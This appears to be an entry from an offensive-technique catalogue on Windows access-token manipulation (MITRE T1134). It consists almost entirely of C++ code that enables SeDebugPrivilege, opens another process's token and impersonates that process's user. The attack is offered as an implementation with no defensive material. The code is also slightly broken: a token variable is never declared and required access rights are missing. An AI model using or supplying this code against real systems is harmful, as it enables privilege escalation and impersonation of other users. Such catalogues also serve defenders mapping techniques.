---
title: Token Manipulation
description: Attackers manipulate access token to impersonate user or create another process with token.
type: Privilege Escalation
platforms:
    - Windows
actors:
malwares:
link_atomicredteam:
link_mitreattack: https://attack.mitre.org/techniques/T1134/
refs:
pubDate: 2024-06-28
---

```c++
// manipulate_token.cpp

// This function checks the privileges of the token.
BOOL CheckPrivilege(HANDLE hToken, LPCTSTR priv)
{
    LUID luid;

    if (!LookupPrivilegeValueW(
        NULL,
        priv,
        &luid
    )) {
        return FALSE;
    }

    PRIVILEGE_SET ps;
    BOOL bResult = FALSE;

    ps.PrivilegeCount = 1;
    ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
    ps.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    ps.Privilege[0].Luid = luid;

    PrivilegeCheck(hToken, &ps, &bResult);

    return bResult;
}

// This function enables/disables a specified privilege to target token.
BOOL SetPrivilege(HANDLE hToken, LPCTSTR priv, BOOL bEnablePriv)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(
        NULL,
        priv,
        &luid
    )) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePriv)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    // Enable/disable privileges
    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL
    )) {
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        return FALSE;
    }

    return TRUE;
}

// Main function in this technique here.
int ManipulateToken()
{
    // Set target process ID
    DWORD dwPID = 1234;

    // Open current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken))
    {
        return EXIT_FAILURE;
    }

    // Check/set the privileges of current token.
    if (!CheckPrivilege(hCurrentToken, SE_DEBUG_NAME))
    {
        if (!SetPrivilege(hCurrentToken, SE_DEBUG_NAME, TRUE))
        {
            return EXIT_FAILURE;
        }
    }

    // Open target process token handle
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPID);
    if (!hProcess)
    {
        return EXIT_FAILURE;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
    {
        return EXIT_FAILURE;
    }

    // Token Impersonation with the manipulated token.
    if (!ImpersonateLoggedOnUser(hToken))
    {
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```